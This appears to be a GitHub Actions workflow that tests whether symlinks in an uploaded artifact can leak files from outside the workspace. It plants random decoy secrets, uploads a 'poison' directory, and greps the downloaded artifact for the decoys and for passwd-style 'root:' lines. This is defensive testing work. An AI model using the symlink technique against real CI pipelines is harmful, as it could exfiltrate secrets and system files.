name: artifact-symlink-escalate
on: workflow_dispatch
permissions:
  contents: read
  actions: write
jobs:
  upload:
    runs-on: ubuntu-latest
    steps:
      - name: Trusted prior step writes secret outside workspace
        run: |
          set -euo pipefail
          echo "SECRET_TOKEN_$(openssl rand -hex 16)" > "$RUNNER_TEMP/ci-secret.txt"
          echo "WORK_SECRET_$(openssl rand -hex 8)" > "$GITHUB_WORKSPACE/../work-secret.txt"
          echo "PLANTED_RUNNER_TEMP=$RUNNER_TEMP"
          echo "PLANTED_WORKSPACE_PARENT=$(dirname "$GITHUB_WORKSPACE")"
          ls -la "$RUNNER_TEMP" | head
          ls -la "$(dirname "$GITHUB_WORKSPACE")" | head
          # Show event path for potential future symlink
          echo "GITHUB_EVENT_PATH=$GITHUB_EVENT_PATH"
          head -c 100 "$GITHUB_EVENT_PATH"; echo

      - uses: actions/checkout@v4

      - name: Show poison tree from checkout
        run: |
          set -euo pipefail
          ls -la poison
          find poison -exec ls -la {} \;

      - uses: actions/upload-artifact@v4
        with:
          name: symlink-escalate
          path: poison

  verify:
    needs: upload
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: symlink-escalate
          path: d1
      - name: Inspect for sensitive exfil
        run: |
          set -euo pipefail
          echo "=== tree ==="
          find d1 -print
          echo "=== file types ==="
          find d1 -exec ls -la {} \;
          echo "=== contents (first 300B each) ==="
          find d1 -type f -print0 | while IFS= read -r -d '' f; do
            echo "== $f =="
            file "$f" || true
            head -c 300 "$f" || true
            echo
          done
          if grep -R "SECRET_TOKEN_\|WORK_SECRET_\|root:" d1 2>/dev/null; then
            echo "RESULT=SENSITIVE_EXFIL"
          else
            echo "RESULT=NO_SENSITIVE_OR_LINK_ONLY"
          fi
